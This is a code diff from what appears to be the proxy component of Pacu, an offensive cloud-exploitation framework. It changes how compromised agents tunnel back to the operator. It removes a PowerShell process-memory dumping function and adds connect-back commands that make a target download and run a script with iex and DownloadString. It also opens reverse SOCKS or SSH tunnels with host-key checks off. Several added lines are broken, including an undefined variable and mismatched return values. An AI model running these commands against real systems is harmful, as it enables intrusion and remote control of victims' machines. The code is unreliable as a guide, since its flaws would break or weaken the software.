@@ -13,6 +13,7 @@ import sys
 import threading
 import time
 import traceback
+from http.server import BaseHTTPRequestHandler, HTTPServer
 
 try:
     import requests
@@ -399,10 +400,10 @@ class Main:
         else:
             return 'Incorrect input, expected target operating system ("sh" or "ps"), received: {}'.format(os)
 
-    def get_ssh_user(self, ssh_username):
+    def get_ssh_user(self, ssh_username, ssh_password=None):
         user_id = ''
         if ssh_username is None or ssh_username == '':
-            new_user = self.input('No SSH user found to create the reverse connection back from the target agent. An SSH user on the PacuProxy server is required to create a valid socks proxy routing through the remote agent. The user will be created with password login disabled and a /bin/false shell. Do you want to generate that user now? (y/n) ')
+            new_user = self.input('No SSH user found to create the reverse connection back from the target agent. An SSH user on the PacuProxy server is required to create a valid socks proxy routing through the remote agent. The user will be created with a random 25 character password and a /bin/false shell. Do you want to generate that user now? (y/n) ')
 
             if new_user == 'y':
                 # Create a random username that is randomly 3-9 characters
@@ -416,95 +417,46 @@ class Main:
                         user_id = subprocess.check_output('id -u {}'.format(username), shell=True).decode('utf-8')
                         if 'no such user' in user_id:
                             self.print('[0] Failed to find user after creation. Here is the output from the command "id -u {}": {}\n'.format(username, user_id))
-                            return None
-                        self.print('User {} created successfully!\n'.format(username))
-                        return username
+                            return None, None, False
+                        self.print('User {} created! Adding a password...\n'.format(username))
+                        password = ''.join(random.choices(string.ascii_lowercase + string.ascii_uppercase + string.digits, k=25))
+                        command = 'echo "{}:{}" | chpasswd'.format(username, password)
+                        try:
+                            subprocess.run(command.split(' '), shell=True)
+                        except Exception as error:
+                            self.print('Failed to add a password...\n')
+                            return username, None, True
+                        return username, password, True
                     except Exception as error:
-                        self.print('[1] Failed to find user after creation. Here is the output from the command "id -u {}": {}\n'.format(username, user_id))
-                        return None
+                        self.print('Failed to find user after creation. Here is the output from the command "id -u {}": {}\n'.format(username, user_id))
+                        return None, None, False
 
                 except Exception as error:
-                    self.print('[2] Failed to create user...')
-                    return None
+                    self.print('Failed to create user...')
+                    return None, None, False
 
             else:
-                return None
+                return None, None, False
 
         else:
             try:
                 user_id = subprocess.check_output('id -u {}'.format(ssh_username), shell=True).decode('utf-8')
                 if 'no such user' in user_id:
-                    self.print('[3] Failed to find a valid SSH user. Here is the output from the command "id -u {}": {}\n'.format(ssh_username, user_id))
-                    new_user = self.input('An SSH user on the PacuProxy server is required to create a valid socks proxy routing through the remote agent. The user will be created with password login disabled and a /bin/false shell. Do you want to generate that user now? (y/n) ')
+                    self.print('Failed to find a valid SSH user. Here is the output from the command "id -u {}": {}\n'.format(ssh_username, user_id))
+                    new_user = self.input('An SSH user on the PacuProxy server is required to create a valid socks proxy routing through the remote agent. The user will be created with a random 25 character password and a /bin/false shell. Do you want to generate that user now? (y/n) ')
                     if new_user == 'y':
-                        return self.get_ssh_user(None)
+                        return self.get_ssh_user(None, None)
                     else:
-                        return None
+                        return None, None, False
                 else:
-                    return ssh_username
+                    return ssh_username, ssh_password
             except Exception as error:
-                self.print('[4] Failed to find a valid SSH user. Here is the output from the command "id -u {}": {}\n'.format(ssh_username, user_id))
-                new_user = self.input('An SSH user on the PacuProxy server is required to create a valid socks proxy routing through the remote agent. The user will be created with password login disabled and a /bin/false shell. Do you want to generate that user now? (y/n) ')
+                self.print('Failed to find a valid SSH user. Here is the output from the command "id -u {}": {}\n'.format(ssh_username, user_id))
+                new_user = self.input('An SSH user on the PacuProxy server is required to create a valid socks proxy routing through the remote agent. The user will be created with a random 25 character password and a /bin/false shell. Do you want to generate that user now? (y/n) ')
                 if new_user == 'y':
-                    return self.get_ssh_user(None)
+                    return self.get_ssh_user(None, None)
                 else:
-                    return None
-
-    def get_ssh_key(self, ssh_username, ssh_priv_key):
-        if ssh_priv_key is None or ssh_priv_key == '':
-            new_key = self.input('No SSH key found for user {}. Do you want to generate one? (y/n) '.format(ssh_username))
-
-            if new_key == 'y':
-                self.print('Setting up SSH access for user {}...\n'.format(ssh_username))
-                ssh_dir = '/home/{}/.ssh'.format(ssh_username)
-                command = 'ssh-keygen -t rsa -f {}/id_rsa'.format(ssh_dir)
-
-                try:
-                    self.print('Creating .ssh dir for user {ssh_username} and passing ownership...')
-                    if not os.path.isdir(ssh_dir):
-                        os.makedirs(ssh_dir)
-                    subprocess.run('chown -R {}:{} {}'.format(ssh_username, ssh_username, ssh_dir).split(' '))
-                    subprocess.run('chmod 700 {}'.format(ssh_dir).split(' '))
-                    self.print('Generating public and private SSH key...')
-                    subprocess.run(command.split(' '))
-                    self.print('Creating authorized_keys file...')
-                    subprocess.run('cp {}/id_rsa.pub {}/authorized_keys'.format(ssh_dir, ssh_dir).split(' '))
-
-                    self.print('Ensuring that local port forwarding is disabled (to prevent a "hack back" scenario)...')
-                    action = ''
-                    with open('/etc/ssh/sshd_config', 'r') as config_file:
-                        contents = config_file.read()
-                        if 'AllowTcpForwarding' in contents:
-                            if 'AllowTcpForwarding remote' in contents:
-                                self.print('Already disabled.')
-                            else:
-                                action = 'replace'
-                        else:
-                            action = 'add'
-
-                    with open('/etc/ssh/sshd_config', 'w') as config_file:
-                        if action == 'replace':
-                            contents = re.sub(r'.*AllowTcpForwarding.*', 'AllowTcpForwarding remote', contents)
-                            config_file.write(contents)
-                        elif action == 'add':
-                            contents += '\nAllowTcpForwarding remote'
-                            config_file.write(contents)
-                        else:
-                            config_file.write(contents)
-                    with open('{}/id_rsa'.format(ssh_dir), 'r') as config_file:
-                        ssh_priv_key = config_file.read()
-
-                    return ssh_priv_key
-
-                except Exception as error:
-                    self.print('[5] Could not setup SSH access for user {}...'.format(ssh_priv_key))
-                    return None
-
-            else:
-                return None
-
-        else:
-            return ssh_priv_key
+                    return None, None, False
 
     # Pacu commands and execution
 
@@ -621,7 +573,7 @@ class Main:
         proxy_port = proxy_settings.port
         proxy_listening = proxy_settings.listening
         proxy_ssh_username = proxy_settings.ssh_username
-        proxy_ssh_priv_key = proxy_settings.ssh_priv_key
+        proxy_ssh_password = proxy_settings.ssh_password
         proxy_target_agent = copy.deepcopy(proxy_settings.target_agent)
 
         if len(command) == 1 or (len(command) == 2 and command[1] == 'help'):  # Display proxy help
@@ -692,47 +644,30 @@ class Main:
                         if platform.system() == 'Windows':
                             self.print('** Windows hosts do not currently support module proxying. Run the PacuProxy server on a Linux host for full module proxying capability. **')
                             return
+
                         try:
                             test = int(command[2])
                         except:
                             self.print('** Invalid agent ID, expected an integer or "none", received: {} **'.format(command[2]))
                             return
-                        proxy_target_agent = self.server.all_addresses[int(command[2])]
 
-                        #if proxy_target_agent[-1].startswith('Windows'):
-                        #    self.print('** Invalid agent target. Windows hosts are not supported as a proxy agent (coming soon), but they can still be staged and you can still run shell commands on them. **')
-                        #    return
+                        proxy_target_agent = self.server.all_addresses[int(command[2])]
 
                         print('Setting proxy target to agent {}...'.format(command[2]))
 
-                        old_username = proxy_ssh_username
-
                         # Find or create an SSH user
-                        proxy_ssh_username = self.get_ssh_user(proxy_ssh_username)
+                        proxy_ssh_username, proxy_ssh_password, new = self.get_ssh_user(proxy_ssh_username, proxy_ssh_password)
                         if proxy_ssh_username is None:
                             self.print('No SSH user on the local PacuProxy server, not routing traffic through the target agent.')
                             return
-
-                        # In case there previously was a user and for some reason a new one needed to be created,
-                        # ensure that a new key gets created for them
-                        if not old_username == proxy_ssh_username:
-                            proxy_ssh_priv_key = None
-
-                        restart = False
-                        if proxy_ssh_priv_key is None or proxy_ssh_priv_key == '':
-                            restart = True
-
-                        # Find or generate an SSH key for that user
-                        proxy_ssh_priv_key = self.get_ssh_key(proxy_ssh_username, proxy_ssh_priv_key)
-                        if proxy_ssh_priv_key is None:
-                            self.print('No SSH key for user {}, not routing traffic through the target agent.'.format(proxy_ssh_username))
-                            proxy_settings.update(self.database, ssh_username=proxy_ssh_username)
+                        if proxy_ssh_password is None:
+                            self.print('Failed to set a password for user {}, not routing traffic through the target agent.'.format(proxy_ssh_user))
                             return
 
-                        # If an SSH key was just generated, make sure local port forwarding is disabled
-                        if restart is True:
-                            self.print('SSH user setup successfully. It is highly recommended to restart your sshd service before continuing. Part of the SSH user creation process was to restrict access to local port forwarding, but this change requires an sshd restart. If local port forwarding is not disabled, your target machine can "hack back" by forwarding your local ports to their machine and accessing the services hosted on them. This can be done by running "service sshd restart".\n')
-                            proxy_settings.update(self.database, ssh_username=proxy_ssh_username, ssh_priv_key=proxy_ssh_priv_key)
+                        # If an SSH user was just generated, make sure local port forwarding is disabled
+                        if new is True:
+                            self.print('SSH user setup successfully. It is highly recommended to restart your sshd service before continuing. Part of the SSH user creation process was to restrict access to local port forwarding, but this change requires an sshd restart. If local port forwarding is not disabled, your target machine can "hack back" by forwarding your local ports to their machine and accessing the services hosted on them. This can be done on most systems by running "service sshd restart".\n')
+                            proxy_settings.update(self.database, ssh_username=proxy_ssh_username, ssh_password=proxy_ssh_password)
                             restart_sshd = self.input('  Do you want Pacu to restart sshd (Warning: If you are currently connected to your server over SSH, you may lose your connection)? Press enter if so, enter "ignore" to ignore this warning, or press Ctrl+C to exit and restart it yourself (Enter/ignore/Ctrl+C): ')
 
                             if restart_sshd == 'ignore':
@@ -740,13 +675,11 @@ class Main:
                             elif restart_sshd == '':
                                 self.print('Restarting sshd...')
                                 subprocess.run('service sshd restart', shell=True)
+                                time.sleep(5)
 
                         self.print('Telling remote agent to connect back...')
 
                         if proxy_target_agent[-1].startswith('Windows'):
-
-                            from http.server import BaseHTTPRequestHandler, HTTPServer
-
                             class S(BaseHTTPRequestHandler):
                                 def _set_headers(self):
                                     self.send_response(200)
@@ -755,75 +688,23 @@ class Main:
 
                                 def do_GET(self):
                                     self._set_headers()
-                                    self.wfile.write(b"""function Out-Minidump
-{
-    [CmdletBinding()]
-    Param (
-        [Parameter(Position = 0, Mandatory = $True, ValueFromPipeline = $True)]
-        [System.Diagnostics.Process]
-        $Process,
-
-        [Parameter(Position = 1)]
-        [ValidateScript({ Test-Path $_ })]
-        [String]
-        $DumpFilePath = $PWD
-    )
-
-    BEGIN
-    {
-        $WER = [PSObject].Assembly.GetType('System.Management.Automation.WindowsErrorReporting')
-        $WERNativeMethods = $WER.GetNestedType('NativeMethods', 'NonPublic')
-        $Flags = [Reflection.BindingFlags] 'NonPublic, Static'
-        $MiniDumpWriteDump = $WERNativeMethods.GetMethod('MiniDumpWriteDump', $Flags)
-        $MiniDumpWithFullMemory = [UInt32] 2
-    }
-
-    PROCESS
-    {
-        $ProcessId = $Process.Id
-        $ProcessName = $Process.Name
-        $ProcessHandle = $Process.Handle
-        $ProcessFileName = "$($ProcessName)_$($ProcessId).dmp"
-
-        $ProcessDumpPath = Join-Path $DumpFilePath $ProcessFileName
-
-        $FileStream = New-Object IO.FileStream($ProcessDumpPath, [IO.FileMode]::Create)
-
-        $Result = $MiniDumpWriteDump.Invoke($null, @($ProcessHandle,
-                                                     $ProcessId,
-                                                     $FileStream.SafeFileHandle,
-                                                     $MiniDumpWithFullMemory,
-                                                     [IntPtr]::Zero,
-                                                     [IntPtr]::Zero,
-                                                     [IntPtr]::Zero))
-
-        $FileStream.Close()
-
-        if (-not $Result)
-        {
-            $Exception = New-Object ComponentModel.Win32Exception
-            $ExceptionMessage = "$($Exception.Message) ($($ProcessName):$($ProcessId))"
-            Remove-Item $ProcessDumpPath -ErrorAction SilentlyContinue
-
-            throw $ExceptionMessage
-        }
-        else
-        {
-            Get-ChildItem $ProcessDumpPath
-        }
-    }
-
-    END {}
-}"""
-                                    )
+                                    with open('pp_modules/powershell/reverse-socks.ps1', 'r') as f:
+                                        script = f.read().encode()
+                                    self.wfile.write(script)
                                     return
         
                             def run(server_class=HTTPServer, handler_class=S, port=80):
-                                server_address = ('0.0.0.0', port)
-                                httpd = server_class(server_address, handler_class)
-                                print('Starting httpd...')
+                                server_address = (proxy_ip, port)
+                                try:
+                                    httpd = server_class(server_address, handler_class)
+                                except OSError as error:
+                                    if 'Cannot assign requested address' in str(error):
+                                        print('Failed to listen on http://{}:{}. This is a known error.'.format(proxy_ip, port))
+                                        print('Listening on http://0.0.0.0:{} instead...'.format(port))
+                                        server_address = ('0.0.0.0', port)
+                                        httpd = server_class(server_address, handler_class)
                                 httpd.serve_forever()
-                            import threading
+
                             t = threading.Thread(target=run, daemon=True)
                             t.start()
                             time.sleep(2)
@@ -833,11 +714,10 @@ class Main:
                             # Continue to send the connect_back_cmd
                             # Kill HTTP server
 
-                            connect_back_cmd = 'iex ((New-Object System.Net.WebClient).DownloadString("http://{}:{}/asd")); Out-MiniDump -Process $(Get-Process -Id 8172)'.format(proxy_ip, proxy_port) 
-                            #Start-SocksProxy -sshhost {} -username {} -password {} -RemotePort 8001 -LocalPort 5050'.format(proxy_ip, proxy_port, proxy_ip, proxy_ssh_username, 'super-secret-password')
+                            connect_back_cmd = 'iex ((New-Object System.Net.WebClient).DownloadString("http://{}:{}/asd")); Start-SocksProxy -sshhost {} -username {} -password {} -RemotePort 8001 -LocalPort 5050'.format(proxy_ip, proxy_port, proxy_ip, proxy_ssh_username, proxy_ssh_password)
                         else:
                             shm_name = ''.join(random.choices(string.ascii_lowercase, k=int(''.join(random.choices('3456789', k=1)))))
-                            connect_back_cmd = 'echo "{}" > /dev/shm/{} && chmod 600 /dev/shm/{} && ssh -i /dev/shm/{} -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -f -N -R 8001 {}@{} >/dev/null 2>&1 &'.format(proxy_ssh_priv_key, shm_name, shm_name, shm_name, proxy_ssh_username, proxy_ip)
+                            connect_back_cmd = 'echo {} | ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -f -N -R 8001 {}@{} >/dev/null 2>&1 &'.format(proxy_ssh_password, proxy_ssh_username, proxy_ip)
                         self.server.run_cmd(proxy_target_agent[0], self.server.all_connections[int(command[2])], connect_back_cmd)
                         self.print('Remote agent instructed to connect!')
                 except Exception as error:
